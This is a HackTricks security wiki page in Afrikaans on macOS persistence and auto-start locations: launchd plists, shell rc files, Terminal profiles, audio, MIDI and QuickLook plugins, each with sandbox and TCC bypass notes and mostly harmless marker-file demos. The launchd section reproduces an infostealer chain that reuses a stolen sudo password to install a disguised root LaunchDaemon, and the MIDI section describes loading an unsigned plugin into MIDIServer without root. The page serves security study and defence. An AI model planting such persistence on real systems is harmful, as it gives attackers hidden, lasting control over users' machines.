# macOS-outo-aanvang

{{#include ../banners/hacktricks-training.md}}

Hierdie afdeling is grootliks gebaseer op die blogreeks [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Die doel daarvan is om liggings te identifiseer waar die skryf van ’n lêer later tot kode-uitvoering kan lei, watter gebeurtenis uitvoering aktiveer en watter toestemmings vereis word. Die teenwoordigheid van ’n ligging bewys nie dat die meganisme geaktiveer is nie. Die plaaslike kontroles hieronder is op macOS 26.5.2 (5 Oktober 2026) uitgevoer; dit bevestig nie gedrag op elke macOS-vrystelling nie.

> [!NOTE]
> “Skryf-geaktiveer” beteken nie altyd “loop onmiddellik nadat daar geskryf is” nie. Sommige liggings word slegs by aanmelding gelees, wanneer ’n spesifieke toepassing begin, of wanneer ’n gebruiker ’n handeling uitvoer. ’n Skryfbare payload binne ’n reeds gekonfigureerde taak is ook iets anders as toestemming om ’n nuwe taak te registreer. Toets dit in ’n weggooibare rekening of VM voordat jy op ’n tegniek staatmaak.

## Sandbox Bypass

> [!TIP]
> Hier kan jy beginliggings vind wat nuttig is vir **sandbox bypass** en jou toelaat om iets eenvoudig uit te voer deur dit **na ’n lêer te skryf** en te **wag** vir ’n baie **algemene** **handeling**, ’n vasgestelde **tydperk**, of ’n **handeling wat jy gewoonlik kan uitvoer** vanuit ’n sandbox sonder root-toestemmings.

### Launchd

- Nuttig vir sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Liggings

- **`/Library/LaunchAgents`**
  - **Sneller**: Gebruiker se aanmelding (of eksplisiete registrasie)
  - Root vereis
- **`/Library/LaunchDaemons`**
  - **Sneller**: Stelsel se selflaai (of eksplisiete registrasie)
  - Root vereis
- **`/System/Library/LaunchAgents`**
  - **Sneller**: Gebruiker se aanmelding; beskermde Apple-stelselligging
- **`/System/Library/LaunchDaemons`**
  - **Sneller**: Stelsel se selflaai; beskermde Apple-stelselligging
- **`~/Library/LaunchAgents`**
  - **Sneller**: Her-aanmelding

Daar is geen `~/Library/LaunchDaemons`-ligging wat deur `launchd` geskandeer word nie. Per-gebruiker-take hoort in `~/Library/LaunchAgents`; die stelseldemoon-gids is `/Library/LaunchDaemons`. [Apple se opstartgids vir launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) dokumenteer die liggings wat geskandeer word.

> [!TIP]
> ’n Interessante feit is dat **`launchd`** ’n ingebedde property list in die Mach-o-afdeling `__Text.__config` het, wat ander bekende dienste bevat wat launchd moet begin. Boonop kan hierdie dienste die `RequireSuccess`, `RequireRun` en `RebootOnSuccess` bevat, wat beteken dat hulle uitgevoer moet word en suksesvol moet voltooi.
>
> Natuurlik kan dit nie gewysig word nie weens code signing.

#### Beskrywing en uitbuiting

**`launchd`** is die **eerste** **proses** wat deur die OS X-kern tydens opstart uitgevoer word, en die laaste een wat tydens afskakeling voltooi. Dit behoort altyd **PID 1** te hê. Hierdie proses sal die konfigurasies wat in die **ASEP**-**plists** aangedui word, in die volgende liggings **lees en uitvoer**:

- `/Library/LaunchAgents`: Per-gebruiker-agents wat deur die admin geïnstalleer is
- `/Library/LaunchDaemons`: Stelselwye daemons wat deur die admin geïnstalleer is
- `/System/Library/LaunchAgents`: Per-gebruiker-agents wat deur Apple verskaf word.
- `/System/Library/LaunchDaemons`: Stelselwye daemons wat deur Apple verskaf word.

Wanneer ’n gebruiker aanmeld, laai `launchd` die plists in daardie gebruiker se `~/Library/LaunchAgents` met daardie gebruiker se toestemmings. Take word volgens hul sleutels begin; die laai van ’n plist alleen beteken nie dat ’n proses onmiddellik uitgevoer word nie.

Die **hoofverskil tussen agents en daemons is dat agents gelaai word wanneer die gebruiker aanmeld, terwyl daemons tydens stelselopstart gelaai word** (omdat daar dienste soos ssh is wat uitgevoer moet word voordat enige gebruiker toegang tot die stelsel kry). Agents kan ook GUI gebruik, terwyl daemons in die agtergrond moet loop.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Elke `ProgramArguments`-element is ’n aparte argument; `launchd` ontleed nie ’n enkele string as ’n shell-opdrag nie. Die reggestelde voorbeeld hierbo kan sintaksisgekontroleer word sonder om dit te laai, met `plutil -lint /path/to/example.plist`. Raadpleeg die plaaslike `man launchd.plist`-inskrywing vir `ProgramArguments`, `RunAtLoad` en `KeepAlive`.

#### Lêergebeurtenis-snellers in bestaande take

’n **Reeds gelaaide** agent of daemon kan `WatchPaths` gebruik om te begin wanneer ’n benoemde pad verander. `QueueDirectories` begin ’n taak terwyl ’n gids nie leeg is nie; `StartOnMount` begin wanneer ’n volume gemonteer word. [Apple se launchd-gids](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) bevat voorbeelde van `WatchPaths` en `QueueDirectories`. ’n Skryfbewerking na ’n lêer waarna gekyk word, aktiveer die **reeds gekonfigureerde taak**; dit bied arbitrêre kode-uitvoering slegs as die skrywer ook beheer kan uitoefen oor die taak se uitvoerbare lêer, skrip of data wat die taak interpreteer. Om bloot ’n nuwe plist buite ’n geskandeerde of geregistreerde ligging te skryf, laai dit nie.

Hierdie selfreinigende PoC registreer ’n uniek benoemde **tydelike gebruikersagent**, verander slegs sy eie lêer waarna gekyk word en verwyder die agent. Dit is suksesvol op macOS 26.5.2 uitgevoer sonder om af te meld of te herbegin:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Die plaaslike uitvoering het `watch fired: True` vertoon, en `bootout` het geslaag. `launchctl bootstrap` word hier slegs binne die geïsoleerde PoC gebruik; dit is **nie** nodig vir ’n taak wat reeds gelaai is nie. Om ’n bestaande taak veilig te beoordeel, lees sy plist en die opgeloste `ProgramArguments`-pad, en kontroleer dan of die betrokke uitvoerbare lêer of geïnterpreteerde lêer skryfbaar is, sonder om dit te verander.

Daar is gevalle waar ’n **agent uitgevoer moet word voordat die gebruiker aanmeld**; dit word **PreLoginAgents** genoem. Dit is byvoorbeeld nuttig om ondersteunende tegnologie tydens aanmelding beskikbaar te stel. Hulle kan ook in `/Library/LaunchAgents` gevind word (sien [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) vir ’n voorbeeld).

> [!TIP]
> Nuwe Daemon- of Agent-konfigurasielêers sal **gelaai word ná die volgende herlaai of deur** `launchctl load <target.plist>` te gebruik. Dit is **ook moontlik om .plist-lêers sonder daardie uitbreiding te laai** met `launchctl -F <file>` (daardie plist-lêers sal egter nie outomaties ná herlaai gelaai word nie).\
> Dit is ook moontlik om hulle te **ontlaai** met `launchctl unload <target.plist>` (die proses waarna dit verwys, sal beëindig word),
>
> Om **seker te maak** dat daar nie **enigiets** (soos ’n oorheersing) is wat **verhoed** dat ’n **Agent** of **Daemon** **loop** nie, voer uit: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Lys al die agente en daemons wat deur die huidige gebruiker gelaai is:

```bash
launchctl list
```

#### Voorbeeld van ’n kwaadwillige LaunchDaemon-ketting (hergebruik van wagwoord)

’n Onlangse macOS-infostealer het ’n **vasgelegde sudo-wagwoord** hergebruik om ’n user agent en ’n root LaunchDaemon te installeer:<sup>[[1]](#references)</sup>

- Skryf die agent-lus na `~/.agent` en maak dit uitvoerbaar.
- Genereer ’n plist in `/tmp/starter` wat na daardie agent verwys.
- Hergebruik die gesteelde wagwoord met `sudo -S` om dit na `/Library/LaunchDaemons/com.finder.helper.plist` te kopieer, stel `root:wheel` in en laai dit met `launchctl load`.
- Begin die agent stilweg met `nohup ~/.agent >/dev/null 2>&1 &` om die uitvoer te ontkoppel.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> ’n daemon plist wat in `/Library/LaunchDaemons` geplaas word, word nie veilig deur dit gebruikersbesit te maak nie. `launchd` vereis gepaste eienaarskap en toestemmings vir stelsel-jobs en kan ’n onveilige plist verwerp. ’n daemon wat deur root besit word, loop gewoonlik as root tensy sy konfigurasie ’n ander rekening kies. Gaan die job se `UserName`, `GroupName`, eienaarskap en `launchctl`-diagnostiek na; moenie die uitvoeringsidentiteit bloot uit die naam van die plist-eienaar aflei nie.

#### Meer inligting oor launchd

**`launchd`** is die **eerste** gebruikersmodusproses wat vanaf die **kernel** begin word. Die proses moet **suksesvol** begin en **mag nie afsluit of omval nie**. Dit is selfs **beskerm** teen sommige **doodseine**.

Een van die eerste dinge wat `launchd` doen, is om al die **daemons** te **begin**, soos:

- **Tydgebaseerde daemons** wat op bepaalde tye uitgevoer word:
  - `com.apple.atrun.plist` roep `/usr/libexec/atrun` met `StartInterval = 30` sekondes aan in macOS 26.5.2; die effektiewe geaktiveerde toestand daarvan kan verskil van die plist se `Disabled`-sleutel omdat launchd oorrides afsonderlik stoor.
  - `com.vix.cron.plist` roep `/usr/sbin/cron` aan wanneer `/usr/lib/cron/tabs` jobs bevat. `com.apple.systemstats.daily` is ’n ander geskeduleerde diens, nie die cron-daemon nie.
- **Netwerkdaemons** soos:
  - `org.cups.cups-lpd`: Luister op TCP (`SockType: stream`) met `SockServiceName: printer`
    - SockServiceName moet óf ’n poort óf ’n diens uit `/etc/services` wees
  - `com.apple.xscertd.plist`: Luister op TCP-poort 1640
- **Paddaemons** wat uitgevoer word wanneer ’n gespesifiseerde pad verander:
  - `com.apple.postfix.master`: Kontroleer die pad `/etc/postfix/aliases`
- **IOKit-kennisgewingdaemons**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach-poort:**
  - `com.apple.xscertd-helper.plist`: Die `MachServices`-inskrywing dui die naam `com.apple.xscertd.helper` aan
- **UserEventAgent:**
  - Dit verskil van die vorige een. Dit laat launchd programme laat loop in reaksie op spesifieke gebeurtenisse. In hierdie geval is die betrokke hoofbinêre egter nie `launchd` nie, maar `/usr/libexec/UserEventAgent`. Dit laai plugins uit die SIP-beperkte vouer /System/Library/UserEventPlugins/, waar elke plugin sy initialiser in die `XPCEventModuleInitializer`-sleutel aandui, of, vir ouer plugins, in die `CFPluginFactories`-dict onder die sleutel `FB86416D-6164-2070-726F-70735C216EC0` van sy `Info.plist`.

### shell-opstartlêers

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet ’n app vind met ’n TCC-omseiling wat ’n shell uitvoer wat hierdie lêers laai

#### Liggings

- **`~/.zshenv`** (of ’n nuwer saamgestelde **`~/.zshenv.zwc`**)
  - **Sneller**: Enige gewone zsh-aanroep, insluitend ’n nie-interaktiewe `zsh -c`; `zsh -f` slaan gebruiker-opstartlêers oor.
- **`~/.zshrc`**
  - **Sneller**: Interaktiewe zsh begin.
- **`~/.zprofile`, `~/.zlogin`**
  - **Sneller**: Login-zsh begin; hierdie lêers word onderskeidelik voor en ná `.zshrc` gelees.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Sneller**: Maak ’n terminaal met zsh oop
  - Root word vereis
- **`~/.zlogout`**
  - **Sneller**: ’n Login-zsh sluit normaal af, nie elke terminaal- of shell-afsluiting nie.
- **`/etc/zlogout`**
  - **Sneller**: Sluit ’n terminaal met zsh af
  - Root word vereis
- Potensieel meer in: **`man zsh`**
- **`~/.bashrc`**
  - **Sneller**: Begin interaktiewe **nie-login** Bash. ’n Interaktiewe login-Bash lees dit slegs as ’n login-lêer dit uitdruklik invoeg.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Sneller**: Begin login-Bash; die eerste leesbare lêer in daardie volgorde word uitgevoer. `~/.profile` word oorgeslaan as een van die vorige lêers bestaan.
- **`/etc/profile`**
  - **Sneller**: Begin login-Bash; om dit te verander, word root vereis.
- **`~/.tcshrc`** of, as dit ontbreek, **`~/.cshrc`**
  - **Sneller**: Begin `tcsh`, insluitend ’n nie-interaktiewe `tcsh -c` op hierdie Mac. Die gebruiker moet werklik `tcsh` aanroep; dit is nie die verstek macOS-shell nie.
- **`~/.login`**
  - **Sneller**: Begin ’n login-`tcsh` ná sy rc-lêer.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Sneller**: Behoort met xterm te aktiveer, maar dit **is nie geïnstalleer nie**, en selfs ná installering word hierdie fout gewys: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Beskrywing & Uitbuiting

Wanneer ’n shell-omgewing soos `zsh` of `bash` begin word, word **sekere opstartlêers uitgevoer**. macOS gebruik tans `/bin/zsh` as die verstek-shell. Of Terminal of SSH ’n login- of interaktiewe shell begin, hang van hul konfigurasie af; moenie aanvaar dat elke lêer hierbo in elke sessie uitgevoer word nie. Hoewel `bash` en `sh` ook in macOS beskikbaar is, moet hulle uitdruklik aangeroep word om gebruik te word.<sup>[[2]](#references)</sup> Die [zsh-opstartlêerverwysing](https://zsh.sourceforge.io/Doc/Release/Files.html) spesifiseer die volgorde, die `ZDOTDIR`-oorheersing en die `.zwc`-reël.

Die volgende leesalleen-eksperiment het ’n weggooibare `ZDOTDIR` op macOS 26.5.2 gebruik. Dit wys watter gebruikerslêers gelees is; geen werklike shell-opstartlêer is verander nie:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Die waargenome volgorde was `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` moet reeds na die alternatiewe gids wys; om bloot lêers in ’n willekeurige gids te skryf, is nie genoeg nie.

[Bash se opstartverwysing](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) onderskei tussen aanmeld- en interaktiewe shells. Op die macOS 26.5.2-toetsmasjien het ’n geïsoleerde `HOME` met al vier gebruiker-opstartlêers die volgende opgelewer: `bash -c` → geen; `bash -ic` → `.bashrc`; `bash -lc` en `bash -lic` → slegs `.bash_profile`. Nadat `.bash_profile` verwyder is, het login Bash `.bash_login` gelees, en daarna `.profile` toe dié ook verwyder is. `BASH_ENV` kan nie-interaktiewe Bash na ’n lêer verwys, maar daardie omgewingsveranderlike moet reeds in die aanroepende proses gestel wees. ’n Eksplisiete `exit` uit ’n login Bash kan ook `~/.bash_logout` laai.

Die plaaslike `tcsh(1)`-handleiding dokumenteer sy afsonderlike opstartvolgorde. Met ’n tydelike `HOME` het `/bin/tcsh -c :` `.tcshrc` gelees, of `.cshrc` toe `.tcshrc` ontbreek het. ’n Tydelike login `tcsh` het `.tcshrc` en `.login` gelees. Hierdie kontroles het slegs tydelike lêers geskep en verwyder.

### Toepassings wat heropen word

> [!CAUTION]
> In die toetsing het die opstelling van die aangeduide uitbuiting, gevolg deur uit- en weer aanmeld, of selfs ’n herlaai, nie die toepassing laat loop nie. Die toepassing moet moontlik loop wanneer hierdie handelinge uitgevoer word.

**Skrywe**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Sneller**: Herbegin en heropen toepassings

#### Beskrywing en uitbuiting

Al die toepassings wat heropen moet word, is binne die plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Om dus jou eie toepassing by die toepassings te voeg wat heropen word, hoef jy net **jou toepassing by die lys te voeg**.

Die UUID kan gevind word deur daardie gids te lys, of met `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Om die toepassings te kontroleer wat heropen sal word, kan jy die volgende uitvoer:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Om **'n toepassing by hierdie lys te voeg** kan jy gebruik:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal-voorkeure

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
  - Terminal het vroeër FDA-toestemmings van die gebruiker gehad wanneer dit gebruik is

#### Ligging

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Sneller**: Maak 'n nuwe Terminal-venster of -oortjie oop met die profiel waarvan die Shell-instellings die opstartopdrag bevat

#### Beskrywing en ontginning

In **`~/Library/Preferences`** word die gebruiker se voorkeure vir die toepassings gestoor. Sommige van hierdie voorkeure kan 'n konfigurasie bevat om **ander toepassings/skrifte uit te voer**.<sup>[[5]](#references)</sup>

Terminal kan byvoorbeeld 'n opdrag tydens die opstart uitvoer:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Hierdie konfigurasie word soos volg in die lêer **`~/Library/Preferences/com.apple.Terminal.plist`** weerspieël:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

As die betrokke profiel ’n opstartopdrag bevat en Terminal daardie voorkeur lees, kan ’n nuwe sessie wat daardie profiel gebruik dit uitvoer. [Apple se huidige Terminal-gids](https://support.apple.com/guide/terminal/trmlshll/mac) dokumenteer die opdrag per profiel onder **Shell → Startup**. Dit is nie genoeg om Terminal bloot oop te maak sonder ’n nuwe sessie wat daardie profiel gebruik nie. Die voorkeurwysigings hieronder is **nie** op die navorsings-Mac uitgevoer nie.

Jy kan dit vanaf die cli byvoeg met:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal-skripte / Ander lêeruitbreidings

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Gebruik Terminal om die FDA-toestemmings te hê van die gebruiker wat dit gebruik

#### Ligging

- **Enige plek**
  - **Trigger**: Maak die spesifieke `.terminal`-, `.command`- of `.tool`-lêer oop

#### Beskrywing en uitbuiting

As ’n gebruiker ’n **`.terminal`**-instellingslêer oopmaak, kan Terminal ’n sessie vanaf die profiel daarvan skep; uitvoerbare **`.command`**- en **`.tool`**-lêers kan ook in Terminal oopmaak. Dit is ’n eksplisiete lêer-oopmaak-trigger, nie uitvoering deur bloot Terminal oop te maak nie. Enige geërfde TCC-toegang hang af van Terminal se werklike toestemmings en die bewerking wat probeer word. Die historiese voorbeeld hieronder is nie op die navorsings-Mac uitgevoer nie.

Probeer dit met:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Jy kan ook die uitbreidings **`.command`**, **`.tool`** gebruik, met gewone shell-skripinhoud; hulle sal ook deur Terminal oopgemaak word.

> [!CAUTION]
> As Terminal **Full Disk Access** het, sal dit daardie aksie kan voltooi (let daarop dat die uitgevoerde opdrag in ’n Terminal-venster sigbaar sal wees).

### Audio-inproppe

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC-bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Jy kan moontlik ekstra TCC-toegang kry

#### Ligging

- **`/Library/Audio/Plug-Ins/HAL`**
  - Root word vereis
  - **Sneller**: Die Core Audio-bediener laai ’n versoenbare HAL-toestelinprop; ’n herbegin van die bediener kan veroorsaak dat dit weer opgespoor word
- **`/Library/Audio/Plug-ins/Components`**
  - Root word vereis
  - **Sneller**: ’n Oudio-gasheer ontdek en instansieer die geïnstalleerde Audio Unit
- **`~/Library/Audio/Plug-ins/Components`**
  - **Sneller**: ’n Oudio-gasheer ontdek en instansieer die geïnstalleerde Audio Unit
- **`/System/Library/Components`**
  - Apple-verskafde, stelselbeskermde ligging
  - **Sneller**: ’n Oudio-gasheer instansieer ’n ooreenstemmende stelselkomponent

#### Beskrywing

Volgens die vorige writeups is dit moontlik om **sommige audio-inproppe te compileer** en hulle te laat laai.<sup>[[6]](#references)[[7]](#references)</sup>

HAL-toestelinproppe en Audio Units gebruik verskillende laaipaaie. [Apple se gids vir Audio Unit-gasheergebruik](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) sê dat ’n gasheer ’n komponent moet vind en instansieer; om een na ’n skandeergids te kopieer of `coreaudiod` te herbegin, bewys nie op sigself dat dit uitgevoer word nie. AUv2-inproppe loop in die gasheerproses, terwyl [Apple se huidige Audio Unit-riglyne](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) sê dat AUv3 by verstek in ’n aparte proses op macOS loop. Handtekening-, sandbox- en biblioteekvalideringskontroles hang van die gasheer af. Geen audio-inprop is op die navorsings-Mac geïnstalleer of uitgevoer nie.

### CoreMIDI-drywers (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
  - Jou kode loop binne die `MIDIServer`-proses, nie in jou app se sandbox nie
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` loop met sy eie `seatbelt`-sandboxprofiel

#### Ligging

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Root word nie vereis nie (skryfbaar deur die gebruiker)
  - **Sneller**: `MIDIServer` begin (weer). Dit word op aanvraag geloods die eerste keer dat enige proses CoreMIDI gebruik (wanneer *Audio MIDI Setup*, GarageBand, ’n DAW of ’n bladsy wat WebMIDI gebruik, oopgemaak word)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Root word vereis
  - **Sneller**: dieselfde as hierbo

#### Beskrywing en uitbuiting

Apple se `MIDIServer` (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) laai MIDI-**drywer**-bundels uit die `Audio/MIDI Drivers`-gidse. Die binêre lêer is deur Apple onderteken, maar word verskaf met die `com.apple.security.cs.disable-library-validation`-reg, en sal dus ’n bundel laai wat **ong onderteken is of ad hoc deur ’n ander span onderteken is**. Dit lei tot kode-uitvoering binne ’n aparte proses wat deur Apple besit word, **sonder root**.<sup>[[53]](#references)</sup>

Geïdentifiseer op macOS 26 (slegs-lees):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

'n Driver is 'n standaardbundel wat 'n `MIDIDriverInterface`-fabriek uitvoer; as jy die payload in die factory/constructor plaas, laat dit loop sodra `MIDIServer` die drivers opsom. Bou dit, plaas dit as `~/Library/Audio/MIDI Drivers/Evil.plugin` en aktiveer dan 'n laai sonder om af te meld of te herlaai:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-omseiling: [🟠](https://emojipedia.org/large-orange-circle)
  - Jy kan dalk ekstra TCC-toegang kry

#### Ligging

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beskrywing en uitbuiting

QuickLook-inproppe kan uitgevoer word wanneer jy **die voorskou van ’n lêer aktiveer** (druk die spasiebalk terwyl die lêer in Finder gekies is) en ’n **inprop wat daardie lêertipe ondersteun** geïnstalleer is.<sup>[[8]](#references)</sup>

Dit is moontlik om jou eie QuickLook-inprop saam te stel, dit op een van die vorige liggings te plaas om dit te laai, en dan na ’n ondersteunde lêer te gaan en die spasiebalk te druk om dit te aktiveer.

Hierdie paaie verwys na verouderde `.qlgenerator`-bundels; [Apple se gids oor Quick Look-argitektuur](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) dokumenteer die soekvolgorde en ooreenstemmende lêertipes. Huidige Quick Look-**app-uitbreidings** word saam met ’n app verpak en het ander registrasie- en uitvoeringsreëls. Die teenwoordigheid van ’n generator bewys nie dat dit vir die tipe gekies word of dat sy kode binne Finder self loop nie. Die verouderde generatorpad is nagegaan aan die hand van dokumentasie en die teenwoordigheid van die gids; geen generator is op die navorsings-Mac geïnstalleer of gelaai nie.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Dit het nie vir my gewerk nie, nóg met die gebruiker se LoginHook nóg met die wortel se LogoutHook

